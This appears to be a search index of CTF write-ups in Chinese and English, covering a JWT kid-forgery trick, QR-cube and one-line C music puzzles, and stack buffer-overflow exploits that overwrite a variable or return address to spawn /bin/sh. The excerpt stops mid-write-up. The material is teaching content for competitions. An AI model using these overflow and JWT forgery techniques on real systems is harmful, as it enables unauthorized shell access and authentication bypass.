            "text": "jwt\u7684header\u4e2d\u6709\u4e00\u500b kid \uff0c\u9019\u500b\u4ee3\u8868\u7684\u662f\u516c\u9470\u7684\u4f4d\u5740\n-  \u53ef\u4ee5\u81ea\u5df1\u7522\u751f\u516c\u79c1\u9470\uff0c\u7528\u79c1\u9470\u52a0\u5bc6\u5f8c\uff0c\u628akid\u6539\u6210\u516c\u9470\u4f4d\u5740\u9001\u56de\u53bb  \u4f46\u662f\u516c\u9470\u7684\u4f4d\u5740\u5728\u4f3a\u670d\u5668\u5e95\u4e0b\u7684\u76ee\u9304\uff0c\u6240\u4ee5\u8981\u5148\u628a\u516c\u9470\u8cbc\u5728pasty\u4e0a\uff0c\u63a5\u8457\u53d6\u51fa\u5728\u4f3a\u670d\u5668\u4e0a\u7684\u4f4d\u5740\u8cbc\u9032\u53bb   \u516c\u9470\u6703\u81ea\u52d5\u52a0\u4e0a.pem\u8a72\u5982\u4f55\u8655\u7406\uff1f  \u5728\u7db2\u5740\u6700\u5f8c\u9762\u52a0\u4e0a?\uff0c\u8b93.pem\u8b8a\u6210\u53c3\u6578", 
            "title": "\u89e3\u6cd5"
        }, 
        {
            "location": "/Writeups/2017/seccon_CTF/Qubic_Rube/", 
            "text": "Qubic Rube\n\n\n\n\nChallenge Link: \nQubic_Rube\n\n\nCategory: programming\n\n\nWriteup: \nQubic Rube\n\n\n\n\nPlease continue to solve Rubic's Cube and read QR code.\n\n\nhttp://qubicrube.pwn.seccon.jp:33654\n\n\nSolution\n\n\nThis challenge is really a \"\nprogramming challenge\n\". Orz\n\n\nThis site give you a Rubik's Cube like the photo below, you should \nsolve\n it and \nscan\n the QRcode. Then, you will get a link to the next Rubik's Cube......\n\n\n\n\nBe careful: The URLs are not always the same color\n\n\n\n\ndownload all six images and split each one to nine parts.\n\n\ncategorized depend on the background color.\n\n\nthere are four possible pieces at same place because of rotation.\n\n\ntry every possible QRcode brutally to find the right one.\n\n\n\n\n******************11ed5b705e72e9fa2e57******************\n11 : (255, 213, 0)\nSECCON 2017 Online CTF                                   \n11 : (196, 30, 58)\nQubic Rube                                               \n11 : (255, 88, 0)\nNext URL is:                                             \n11 : (255, 255, 255)\nHave fun!                                                \n11 : (0, 81, 186)\nNo. 11 / 50                                              \n11 : (0, 158, 96)\nhttp://qubicrube.pwn.seccon.jp:33654/12de86366ccad8ad3f0e\nfind at color (0, 158, 96)\n******************12de86366ccad8ad3f0e******************\n12 : (255, 213, 0)\nNo. 12 / 50                                              \n12 : (196, 30, 58)\nNext URL is:                                             \n12 : (255, 88, 0)\nQubic Rube                                               \n12 : (255, 255, 255)\nhttp://qubicrube.pwn.seccon.jp:33654/131c139206e8120f4e89\nfind at color (255, 255, 255)\n******************131c139206e8120f4e89******************\n13 : (255, 213, 0)\nNext URL is:\n\n\n\n\nDependency\n\n\n\n\nPIL\n\n\nzbarlight", 
            "title": "Qubic Rube"
        }, 
        {
            "location": "/Writeups/2017/seccon_CTF/Qubic_Rube/#qubic-rube", 
            "text": "Challenge Link:  Qubic_Rube  Category: programming  Writeup:  Qubic Rube   Please continue to solve Rubic's Cube and read QR code.  http://qubicrube.pwn.seccon.jp:33654", 
            "title": "Qubic Rube"
        }, 
        {
            "location": "/Writeups/2017/seccon_CTF/Qubic_Rube/#solution", 
            "text": "This challenge is really a \" programming challenge \". Orz  This site give you a Rubik's Cube like the photo below, you should  solve  it and  scan  the QRcode. Then, you will get a link to the next Rubik's Cube......   Be careful: The URLs are not always the same color   download all six images and split each one to nine parts.  categorized depend on the background color.  there are four possible pieces at same place because of rotation.  try every possible QRcode brutally to find the right one.   ******************11ed5b705e72e9fa2e57******************\n11 : (255, 213, 0)\nSECCON 2017 Online CTF                                   \n11 : (196, 30, 58)\nQubic Rube                                               \n11 : (255, 88, 0)\nNext URL is:                                             \n11 : (255, 255, 255)\nHave fun!                                                \n11 : (0, 81, 186)\nNo. 11 / 50                                              \n11 : (0, 158, 96)\nhttp://qubicrube.pwn.seccon.jp:33654/12de86366ccad8ad3f0e\nfind at color (0, 158, 96)\n******************12de86366ccad8ad3f0e******************\n12 : (255, 213, 0)\nNo. 12 / 50                                              \n12 : (196, 30, 58)\nNext URL is:                                             \n12 : (255, 88, 0)\nQubic Rube                                               \n12 : (255, 255, 255)\nhttp://qubicrube.pwn.seccon.jp:33654/131c139206e8120f4e89\nfind at color (255, 255, 255)\n******************131c139206e8120f4e89******************\n13 : (255, 213, 0)\nNext URL is:", 
            "title": "Solution"
        }, 
        {
            "location": "/Writeups/2017/seccon_CTF/Qubic_Rube/#dependency", 
            "text": "PIL  zbarlight", 
            "title": "Dependency"
        }, 
        {
            "location": "/Writeups/2017/seccon_CTF/putchar_music/", 
            "text": "putchar music\n\n\n\n\nChallenge Link: \nputchar_music\n\n\nCategory: programming\n\n\nWriteup: \nputchar music\n\n\n\n\nThis one line of C program works on Linux Desktop. What is this movie's title? \nPlease answer the flag as SECCON{MOVIES_TITLE}, replace all alphabets with capital letters, and spaces with underscores.\n\n\nmain\n(\nt\n,\ni\n,\nj\n){\nunsigned\n \nchar\n \np\n[]\n=\n###\nf_YM\n\\204\ng_YM\n\\204\ng_Y_H #\nf_YM\n\\204\ng_YM\n\\204\ng_Y_H #+-?[WKAMYJ/7 #+-?[WKgH #+-?[WKAMYJ/7hk\n\\206\\203\ntk\n\\\\\nYJAfkkk\n;\nfor\n(\ni\n=\n0\n;\nt\n=\n1\n;\ni\n=\n(\ni\n+\n1\n)\n%\n(\nsizeof\n(\np\n)\n-\n1\n)){\ndouble\n \nx\n=\npow\n(\n1.05946309435931\n,\np\n[\ni\n]\n/\n6\n+\n13\n);\nfor\n(\nj\n=\n1\n+\np\n[\ni\n]\n%\n6\n;\nt\n++%\n(\n8192\n/\nj\n);)\nputchar\n(\nt\n5\n|\n(\nint\n)(\nt\n*\nx\n));}}\n\n\n\n\n\nSolution\n\n\nI found a cool video \"\nCreating music in one line of C code\n\"on Youtube, and it looked similar to this challenge.\n\n\n\n\nHere is the instructions mentioned below the video:\n\n\n\n\nCompile source code (main.c)\n\n\n\n\ngcc main.c -lm\n\n\n\n\n\n\nPlay with mplayer\n\n\n\n\n./a.out \n|\n mplayer -demuxer rawaudio -rawaudio \nrate\n=\n8000\n:channels\n=\n1\n:samplesize\n=\n1\n -\n\n\n\n\nThen you will get a cool music like \nthis\n !!", 
            "title": "putchar music"
        }, 
        {
            "location": "/Writeups/2017/seccon_CTF/putchar_music/#putchar-music", 
            "text": "Challenge Link:  putchar_music  Category: programming  Writeup:  putchar music   This one line of C program works on Linux Desktop. What is this movie's title? \nPlease answer the flag as SECCON{MOVIES_TITLE}, replace all alphabets with capital letters, and spaces with underscores.  main ( t , i , j ){ unsigned   char   p [] = ### f_YM \\204 g_YM \\204 g_Y_H # f_YM \\204 g_YM \\204 g_Y_H #+-?[WKAMYJ/7 #+-?[WKgH #+-?[WKAMYJ/7hk \\206\\203 tk \\\\ YJAfkkk ; for ( i = 0 ; t = 1 ; i = ( i + 1 ) % ( sizeof ( p ) - 1 )){ double   x = pow ( 1.05946309435931 , p [ i ] / 6 + 13 ); for ( j = 1 + p [ i ] % 6 ; t ++% ( 8192 / j );) putchar ( t 5 | ( int )( t * x ));}}", 
            "title": "putchar music"
        }, 
        {
            "location": "/Writeups/2017/seccon_CTF/putchar_music/#solution", 
            "text": "I found a cool video \" Creating music in one line of C code \"on Youtube, and it looked similar to this challenge.   Here is the instructions mentioned below the video:   Compile source code (main.c)   gcc main.c -lm   Play with mplayer   ./a.out  |  mplayer -demuxer rawaudio -rawaudio  rate = 8000 :channels = 1 :samplesize = 1  -  Then you will get a cool music like  this  !!", 
            "title": "Solution"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/water-impossible/", 
            "text": "water-impossible\n\n\n\n\nChallenge Link: \nwater-impossible\n\n\nCategory: pwn\n\n\nWriteup: \nwater-impossible\n\n\n\n\nWelcome !! Challenger ~\n\n\nHere is a simple challenge for you.\n\n\nTry to find the key to pass.\n\n\nnc bamboofox.cs.nctu.edu.tw 58799\n\n\nwater-impossible.zip\n\n\n\u9808\u5177\u5099\u7684\u77e5\u8b58\n\n\nStack\n\n\nstack \u662f\u7a0b\u5f0f\u5728\u57f7\u884c\u4e2d\u7528\u4f86\u5132\u5b58\u8cc7\u6599\u7684\u7d50\u69cb\uff0c\u5132\u5b58\u7684\u8cc7\u6599\u5982\n\n\n\n\n\u66ab\u6642\u7684\u503c\n\n\nreturn address\n\n\n\u5340\u57df\u8b8a\u6578\n\n\n...\n\n\n\n\nrsp\n\n\nrsp\n \u662f\u7528\u4f86\u5132\u5b58 stack \u6240\u5728\u4f4d\u7f6e\u7684\u66ab\u5b58\u5668\n\n\n\u5340\u57df\u8b8a\u6578\n\n\n\u5ba3\u544a\u5340\u57df\u8b8a\u6578\u6642\uff0c\u6703\u5c07\u503c\u5b58\u5728 stack \u4e0a\n\n\n\u5047\u8a2d\u5ba3\u544a\u5169\u500b\u8b8a\u6578 a, b\n\n\nint\n \na\n \n=\n \n1\n;\n\n\nint\n \nb\n \n=\n \n2\n;\n\n\n\n\n\n\u5ba3\u544a a \u6642\uff0cstack \u72c0\u614b\u5982\u4e0b\n\n\n+----------+    0x7fffffffe728  low\n|  a = 1   |\n+----------+    0x7fffffffe730\n|   ...    |\n+----------+    0x7fffffffe738  high\n\n\n\n\n\u5ba3\u544a b \u6642\uff0cstack \u72c0\u614b\u5982\u4e0b\n\n\n+----------+    0x7fffffffe720  low\n|  b = 2   |\n+----------+    0x7fffffffe728\n|  a = 1   |\n+----------+    0x7fffffffe730\n|   ...    |\n+----------+    0x7fffffffe738  high\n\n\n\n\n\u7576 push \u503c\u9032 stack \u6642\uff0c\nrsp\n \u7684\u4f4d\u7f6e\u6703\u6e1b\u8db3\u5920\u7684\u5927\u5c0f\uff0c\u8b93\u65b0\u7684\u503c\u53ef\u4ee5\u586b\u9032\u4f86\uff0c\u6240\u4ee5\u5f8c\u9032\u4f86\u7684 b \u53cd\u800c\u6703\u5b58\u5728\u8f03\u4f4e\u4f4d\u7684\u5730\u65b9\n\n\nBuffer overflow\n\n\n\u5728\u8b80\u53d6\u8f38\u5165\u7684\u6642\u5019\uff0c\u8f38\u5165\u7684\u5927\u5c0f\u8d85\u904e\u8b8a\u6578\u7684\u5927\u5c0f\uff0c\u6b64\u6642\u591a\u7684\u90e8\u4efd\u6703\u8d85\u8d8a\u5340\u57df\u8b8a\u6578\u7684\u4f4d\u5740\uff0c\u9032\u800c\u84cb\u5230 stack \u4e0a\u7684\u5176\u4ed6\u4f4d\u7f6e\n\n\n\u5047\u8a2d\u6709\u4e00\u7a0b\u5f0f\u5982\u4e0b\n\n\nint\n \nkey\n \n=\n \n0xdeadbeef\n;\n\n\nchar\n \nbuf\n[\n16\n]\n \n=\n \n{\n0\n};\n\n\ngets\n(\nbuf\n);\n\n\n\n\n\n\u5ba3\u544a\u5f8c stack \u72c0\u614b\u5982\u4e0b\n\n\n+----------------+  0x7fffffffe720    low  \n-----+\n|     0x0    |               |\n+----------------+  0x7fffffffe728       |  buf[16]\n|     0x0    |               |\n+----------------+  0x7fffffffe730         \n-----+-----+\n|   0xdeadbeef   |                                     | key\n+----------------+  0x7fffffffe738    high \n-----------+\n\n\n\n\n\u56e0\u70ba gets \u6c92\u6709\u9650\u5236\u8f38\u5165\u7684\u9577\u5ea6\uff0c\u56e0\u6b64\u53ef\u4ee5\u8f38\u5165\u8d85\u904e buf \u9577\u5ea6\uff0c\u6b64\u6642\u591a\u7684\u90e8\u4efd\u5c31\u6703\u84cb\u5230 stack \u5176\u4ed6\u90e8\u4efd\n\n\n\u4f8b\u5982\u8f38\u5165 \naaaaaaaabbbbbbbbcccccccc\n\n\n+----------------+  0x7fffffffe720    low  \n-----+\n|   aaaaaaaa     |               |\n+----------------+  0x7fffffffe728               |  buf[16]\n|   bbbbbbbb     |                               |\n+----------------+  0x7fffffffe730         \n-----+-----+\n|   cccccccc     |                     | key\n+----------------+  0x7fffffffe738    high \n-----------+\n\n\n\n\n\u539f\u672c \nkey\n \u5b58\u7684\u4f4d\u7f6e\u5c31\u88ab buf \u7684\u8f38\u5165\u84cb\u6389\u4e86\n\n\n\u89c0\u5bdf\n\n\n\u89c0\u5bdf\u4e00\u4e0bcode\u5f8c\u53ef\u4ee5\u767c\u73fe\u89f8\u767c\nsystem(\n/bin/sh\n)\n\u7684\u689d\u4ef6\u70ba\n(int)token == 6666\n\n\n\u800ctoken\u662f\u4e00\u500b\u5ba3\u544a\u5728\nmain\n\u4f46\u5f9e\u672a\u88ab\u4f7f\u7528\u5230\u7684\u8b8a\u6578\n\n\nif\n((\nint\n)\ntoken\n \n==\n \n6666\n){\n\n  \nprintf\n(\nwow, That\ns impossible to touch this token ?!\n);\n\n  \nsystem\n(\n/bin/sh\n);\n\n\n}\n\n\n\n\n\n\u53e6\u5916\u53ef\u4ee5\u88abexploit\u7684\u90e8\u4efd\u70ba\nread()\n\u7684 buffer overflow\n\n\nchar\n \nkey\n[\n16\n];\n\n\nread\n(\n0\n,\n \nkey\n,\n \n40\n);\n\n\n\n\n\n\u901a\u5e38\u9019\u985e\u984c\u76ee\u53ef\u80fd\u7684\u4f5c\u6cd5\u6709\u4ee5\u4e0b\u5169\u7a2e\n\n\n\u84cb return\n\n\n\u5982\u679cstack\u4e00\u76f4\u5f80\u4e0b\u84cb\u7684\u8a71\u53ef\u4ee5\u78b0\u5230\nreturn\n\uff0c\u90a3\u5c31\u76f4\u63a5\u8df3\u5230\nsystem(\n/bin/sh\n)\n\u5c31\u597d\u4e86\n\n\n\u4e0d\u904e\u9019\u984c\u6709\u9650\u5236\u9577\u5ea640\uff0c\u6240\u4ee5\u6c92\u8fa6\u6cd5\u84cb\u5230return\n\n\n\u84cb token\n\n\n\u56e0\u70ba\ntoken\n\u4e5f\u662f\u5ba3\u544a\u5728stack\u4e0a\uff0c\u61c9\u8a72\u53ef\u4ee5\u627e\u5230\ntoken\n\u7684\u4f4d\u7f6e\u5f8c\u76f4\u63a5\u84cb\u6210\u60f3\u8981\u7684\u503c\n\n\n\u89e3\u6cd5\n\n\n\u4ee5\u4e0b\u89e3\u6cd5\u662f\u7528\u84cbtoken\u7684\u65b9\u6cd5\n\n\n\u627e paylod \u9577\u5ea6\n\n\n\u5148\u8f38\u5165\u4ee5\u4e0b\u5b57\u4e32\u4f86\u5b9a\u4f4d\n\n\nAAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFF\n\n\n\n\n\u5230\nif((int)token == 6666)\n\u6642 stack \u72c0\u614b\u5982\u4e0b\n\n\n\n\n\u4e0a\u5716\u53ef\u4ee5\u770b\u5230\ntoken\n\u7684\u4f4d\u7f6e\u4ee5\u53ca\u5167\u5bb9\u662f\n[rbp-0x4] : 0x7fffffffdf1c (\nDDDDEEEEEEEE0\u0622\\367\\377\\177\n)\n\n\n\u7531\u6b64\u53ef\u77e5\u5230\ntoken\n\u4e4b\u524d\uff0c\u6240\u9700\u8981\u7684 payload \u9577\u5ea6\u662f \n28\n \uff0c\u4e5f\u5c31\u662f\n\n\nAAAAAAAABBBBBBBBCCCCCCCCDDDD\n\n\n\n\n\u84cbtoken\u7684\u503c\n\n\n\u56e0\u70ba\u9019\u652f\u7a0b\u5f0f\u662f\u5728 \n64\u4f4d\u5143\n \u7684\u74b0\u5883\u7de8\u8b6f\u7684\uff0c\u6240\u4ee5\u9001\u7684\u6642\u5019\u8981\u7d6664\u4f4d\u5143\u7684\u4f4d\u5740\uff0c\u4f7f\u7528 pwntool \u7684\u8a71\u53ea\u8981\u7528\np64()\n\u5c31\u53ef\u4ee5\u56c9\n\n\nr\n.\nsendline\n(\npayload\n \n+\n \np64\n(\n0x1a0a\n))", 
            "title": "water-impossible"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/water-impossible/#water-impossible", 
            "text": "Challenge Link:  water-impossible  Category: pwn  Writeup:  water-impossible   Welcome !! Challenger ~  Here is a simple challenge for you.  Try to find the key to pass.  nc bamboofox.cs.nctu.edu.tw 58799  water-impossible.zip", 
            "title": "water-impossible"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/water-impossible/#_1", 
            "text": "", 
            "title": "\u9808\u5177\u5099\u7684\u77e5\u8b58"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/water-impossible/#stack", 
            "text": "stack \u662f\u7a0b\u5f0f\u5728\u57f7\u884c\u4e2d\u7528\u4f86\u5132\u5b58\u8cc7\u6599\u7684\u7d50\u69cb\uff0c\u5132\u5b58\u7684\u8cc7\u6599\u5982   \u66ab\u6642\u7684\u503c  return address  \u5340\u57df\u8b8a\u6578  ...", 
            "title": "Stack"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/water-impossible/#rsp", 
            "text": "rsp  \u662f\u7528\u4f86\u5132\u5b58 stack \u6240\u5728\u4f4d\u7f6e\u7684\u66ab\u5b58\u5668", 
            "title": "rsp"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/water-impossible/#_2", 
            "text": "\u5ba3\u544a\u5340\u57df\u8b8a\u6578\u6642\uff0c\u6703\u5c07\u503c\u5b58\u5728 stack \u4e0a  \u5047\u8a2d\u5ba3\u544a\u5169\u500b\u8b8a\u6578 a, b  int   a   =   1 ;  int   b   =   2 ;   \u5ba3\u544a a \u6642\uff0cstack \u72c0\u614b\u5982\u4e0b  +----------+    0x7fffffffe728  low\n|  a = 1   |\n+----------+    0x7fffffffe730\n|   ...    |\n+----------+    0x7fffffffe738  high  \u5ba3\u544a b \u6642\uff0cstack \u72c0\u614b\u5982\u4e0b  +----------+    0x7fffffffe720  low\n|  b = 2   |\n+----------+    0x7fffffffe728\n|  a = 1   |\n+----------+    0x7fffffffe730\n|   ...    |\n+----------+    0x7fffffffe738  high  \u7576 push \u503c\u9032 stack \u6642\uff0c rsp  \u7684\u4f4d\u7f6e\u6703\u6e1b\u8db3\u5920\u7684\u5927\u5c0f\uff0c\u8b93\u65b0\u7684\u503c\u53ef\u4ee5\u586b\u9032\u4f86\uff0c\u6240\u4ee5\u5f8c\u9032\u4f86\u7684 b \u53cd\u800c\u6703\u5b58\u5728\u8f03\u4f4e\u4f4d\u7684\u5730\u65b9", 
            "title": "\u5340\u57df\u8b8a\u6578"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/water-impossible/#buffer-overflow", 
            "text": "\u5728\u8b80\u53d6\u8f38\u5165\u7684\u6642\u5019\uff0c\u8f38\u5165\u7684\u5927\u5c0f\u8d85\u904e\u8b8a\u6578\u7684\u5927\u5c0f\uff0c\u6b64\u6642\u591a\u7684\u90e8\u4efd\u6703\u8d85\u8d8a\u5340\u57df\u8b8a\u6578\u7684\u4f4d\u5740\uff0c\u9032\u800c\u84cb\u5230 stack \u4e0a\u7684\u5176\u4ed6\u4f4d\u7f6e  \u5047\u8a2d\u6709\u4e00\u7a0b\u5f0f\u5982\u4e0b  int   key   =   0xdeadbeef ;  char   buf [ 16 ]   =   { 0 };  gets ( buf );   \u5ba3\u544a\u5f8c stack \u72c0\u614b\u5982\u4e0b  +----------------+  0x7fffffffe720    low   -----+\n|     0x0    |               |\n+----------------+  0x7fffffffe728       |  buf[16]\n|     0x0    |               |\n+----------------+  0x7fffffffe730          -----+-----+\n|   0xdeadbeef   |                                     | key\n+----------------+  0x7fffffffe738    high  -----------+  \u56e0\u70ba gets \u6c92\u6709\u9650\u5236\u8f38\u5165\u7684\u9577\u5ea6\uff0c\u56e0\u6b64\u53ef\u4ee5\u8f38\u5165\u8d85\u904e buf \u9577\u5ea6\uff0c\u6b64\u6642\u591a\u7684\u90e8\u4efd\u5c31\u6703\u84cb\u5230 stack \u5176\u4ed6\u90e8\u4efd  \u4f8b\u5982\u8f38\u5165  aaaaaaaabbbbbbbbcccccccc  +----------------+  0x7fffffffe720    low   -----+\n|   aaaaaaaa     |               |\n+----------------+  0x7fffffffe728               |  buf[16]\n|   bbbbbbbb     |                               |\n+----------------+  0x7fffffffe730          -----+-----+\n|   cccccccc     |                     | key\n+----------------+  0x7fffffffe738    high  -----------+  \u539f\u672c  key  \u5b58\u7684\u4f4d\u7f6e\u5c31\u88ab buf \u7684\u8f38\u5165\u84cb\u6389\u4e86", 
            "title": "Buffer overflow"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/water-impossible/#_3", 
            "text": "\u89c0\u5bdf\u4e00\u4e0bcode\u5f8c\u53ef\u4ee5\u767c\u73fe\u89f8\u767c system( /bin/sh ) \u7684\u689d\u4ef6\u70ba (int)token == 6666  \u800ctoken\u662f\u4e00\u500b\u5ba3\u544a\u5728 main \u4f46\u5f9e\u672a\u88ab\u4f7f\u7528\u5230\u7684\u8b8a\u6578  if (( int ) token   ==   6666 ){ \n   printf ( wow, That s impossible to touch this token ?! ); \n   system ( /bin/sh );  }   \u53e6\u5916\u53ef\u4ee5\u88abexploit\u7684\u90e8\u4efd\u70ba read() \u7684 buffer overflow  char   key [ 16 ];  read ( 0 ,   key ,   40 );   \u901a\u5e38\u9019\u985e\u984c\u76ee\u53ef\u80fd\u7684\u4f5c\u6cd5\u6709\u4ee5\u4e0b\u5169\u7a2e", 
            "title": "\u89c0\u5bdf"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/water-impossible/#return", 
            "text": "\u5982\u679cstack\u4e00\u76f4\u5f80\u4e0b\u84cb\u7684\u8a71\u53ef\u4ee5\u78b0\u5230 return \uff0c\u90a3\u5c31\u76f4\u63a5\u8df3\u5230 system( /bin/sh ) \u5c31\u597d\u4e86  \u4e0d\u904e\u9019\u984c\u6709\u9650\u5236\u9577\u5ea640\uff0c\u6240\u4ee5\u6c92\u8fa6\u6cd5\u84cb\u5230return", 
            "title": "\u84cb return"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/water-impossible/#token", 
            "text": "\u56e0\u70ba token \u4e5f\u662f\u5ba3\u544a\u5728stack\u4e0a\uff0c\u61c9\u8a72\u53ef\u4ee5\u627e\u5230 token \u7684\u4f4d\u7f6e\u5f8c\u76f4\u63a5\u84cb\u6210\u60f3\u8981\u7684\u503c", 
            "title": "\u84cb token"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/water-impossible/#_4", 
            "text": "\u4ee5\u4e0b\u89e3\u6cd5\u662f\u7528\u84cbtoken\u7684\u65b9\u6cd5", 
            "title": "\u89e3\u6cd5"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/water-impossible/#paylod", 
            "text": "\u5148\u8f38\u5165\u4ee5\u4e0b\u5b57\u4e32\u4f86\u5b9a\u4f4d  AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFF  \u5230 if((int)token == 6666) \u6642 stack \u72c0\u614b\u5982\u4e0b   \u4e0a\u5716\u53ef\u4ee5\u770b\u5230 token \u7684\u4f4d\u7f6e\u4ee5\u53ca\u5167\u5bb9\u662f [rbp-0x4] : 0x7fffffffdf1c ( DDDDEEEEEEEE0\u0622\\367\\377\\177 )  \u7531\u6b64\u53ef\u77e5\u5230 token \u4e4b\u524d\uff0c\u6240\u9700\u8981\u7684 payload \u9577\u5ea6\u662f  28  \uff0c\u4e5f\u5c31\u662f  AAAAAAAABBBBBBBBCCCCCCCCDDDD", 
            "title": "\u627e paylod \u9577\u5ea6"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/water-impossible/#token_1", 
            "text": "\u56e0\u70ba\u9019\u652f\u7a0b\u5f0f\u662f\u5728  64\u4f4d\u5143  \u7684\u74b0\u5883\u7de8\u8b6f\u7684\uff0c\u6240\u4ee5\u9001\u7684\u6642\u5019\u8981\u7d6664\u4f4d\u5143\u7684\u4f4d\u5740\uff0c\u4f7f\u7528 pwntool \u7684\u8a71\u53ea\u8981\u7528 p64() \u5c31\u53ef\u4ee5\u56c9  r . sendline ( payload   +   p64 ( 0x1a0a ))", 
            "title": "\u84cbtoken\u7684\u503c"
        }, 
        {
            "location": "/Writeups/2018/BambooFox_CTF/infant-gotoheaven/", 
            "text": "infant-gotoheaven\n\n\n\n\nChallenge Link: \ninfant-gotoheaven\n\n\nCategory: pwn\n\n\nWriteup: \ninfant-gotoheaven\n\n\n\n\nWhat's the token to heaven?\n\n\nnc bamboofox.cs.nctu.edu.tw 58796\n\n\ninfant-gotoheaven.zip\n\n\nGo binanry \u5c0f\u8a23\u7ac5\n\n\n\u958b\u59cb\u524d\u5148\u8b1b\u4e00\u4e0b\u5206\u6790 Go \u7684 binanry \u6642\u53ef\u4ee5\u7528\u5230\u7684\u4e00\u4e9b\u5de5\u5177\u4ee5\u53ca\u8a23\u7ac5\n\n\ngo tool objdump\n\n\ngo tool\n\u662f go \u7684\u7de8\u8b6f\u5668\u5167\u5efa\u7684\u5de5\u5177\u96c6\uff0c\u5176\u4e2d\u4e5f\u6709 \nobjdump\n\u53ef\u4ee5\u4f7f\u7528\n\n\n\u4f7f\u7528\u9019\u500b\u5de5\u5177\u7684\u8a71\u53ef\u4ee5\u770b\u5230 source code \u4e2d\u7684\n\u884c\u6578\n\u5c0d\u61c9\u5230\u7684 assembly\n\n\ngo tool objdump infant-gotoheaven \n|\n less\n\n\n\n\n\n\ngdb\n\n\n\u4f7f\u7528\ngdb\n\u8ffd\u8e64\u6642\uff0c\u5728\u57f7\u884c\u5230\nmain\n\u4e4b\u524d\u6703\u7d93\u904e\u4e00\u5927\u5806\u7684\u7a0b\u5e8f\n\n\n\u5728\u8ffd\u8e64 C \u7684 binanry \u6642\uff0c\u901a\u5e38\u6703\u4f7f\u7528 \nb main\n\u4f86\u8a2d\u65b7\u9ede\u5728\nmain\n \u7684\u4e00\u958b\u59cb\n\n\n\u7531\u4e0a\u9762 \ngo tool objdump\n\u7684\u5716\u53ef\u4ee5\u770b\u5230\uff0cGo \u7684 \nmain\n \u53eb\u505a \nmain.main\n \u6240\u4ee5\u8981\u4f7f\u7528\n\n\nb main.main\n\n\n\n\n\u89c0\u5bdf\n\n\n\u9019\u652f\u7a0b\u5f0f\u53ef\u4ee5\u8b93\u4f7f\u7528\u8005\u8f38\u5165\u4e00\u4e32\u5b57\u4e32\n\n\n% ./infant-gotoheaven                     \nGive me your text : \naaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n\n\n\n\nBuffer overflow\n\n\n\u901a\u5e38\u770b\u5230\u9019\u985e\u984c\u76ee\u5927\u6982\u90fd\u662f buffer overflow \uff0c\u6240\u4ee5\u5148\u8a66\u4e00\u4e0b\u80fd\u4e0d\u80fd\u89f8\u767c segmentation fault\n\n\n% ./infant-gotoheaven\nGive me your text : \naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nunexpected fault address 0x0\nfatal error: fault\n[signal SIGSEGV: segmentation violation code=0x80 addr=0x0 pc=0x4a263e]\n\ngoroutine 1 [running]:\nruntime.throw(0x4d8780, 0x5)\n        /usr/local/go/src/runtime/panic.go:605 +0x95 fp=0xc420043f28 sp=0xc420043f08 pc=0x427a05\nruntime.sigpanic()\n        /usr/local/go/src/runtime/signal_unix.go:374 +0x227 fp=0xc420043f78 sp=0xc420043f28 pc=0x43d037\nmain.main()\n        /home/frozenkp/Downloads/gobin/infant-gotoheaven/infant-gotoheaven.go:27 +0x1ee fp=0xc420043f80 sp=0xc420043f78 pc=0x4a263e\n\n\n\n\n\u6700\u5f8c\u4e00\u884c\u6709\u5beb\u5230\u6b7b\u5728\ninfant-gotoheaven.go:27\n\n\n\u7528\nobjdump\n\u770b\u4e00\u4e0b\u767c\u73fe\u662f\u6b7b\u5728\nret\n\uff0c\u6240\u4ee5\u61c9\u8a72\u662f\u53ef\u4ee5\n\u84cb\u5230 return address\n\n\n\n\nweird\n\n\n\u63a5\u8457\u5728\u7ffb\u4e00\u4e0b\nobjdump\n\u7684\u7d50\u679c\uff0c\u767c\u73fe\u4e00\u500b\u53eb \nweird\n\u7684 function\n\n\n\n\n\u5176\u4e2d\u6709\u4e00\u884c\nCALL os/exec.Command(SB)\n\u53ef\u4ee5\u57f7\u884c system call\n\n\n\u6aa2\u67e5\u4e00\u4e0b\u5176\u4ed6\u5730\u65b9\u7684\u7a0b\u5f0f\u78bc\uff0c\u767c\u73fe\nmain.main\n\u6709\u547c\u53eb\u5230\n\n\n\n\n\u4f7f\u7528\ngdb\n\u5f37\u5236\u8b93\ncmp\n\u7b26\u5408\u5f8c\u8df3\u904e\u53bb\u5f8c\u767c\u73fe\u9019\u500b system call \u7684\u53c3\u6578\u662f \n/bin/sh\n\n\n\n\n\u6240\u4ee5\u53ea\u8981\u9032\u5165\u5230\nweird\n\u61c9\u8a72\u5c31\u80fd\u62ff\u5230 shell \u4e86\n\n\n\u89e3\u6cd5\n\n\npayload\n\n\n\u5148\u96a8\u4fbf\u8f38\u5165\u4f86\u9020\u6210 segmenataion 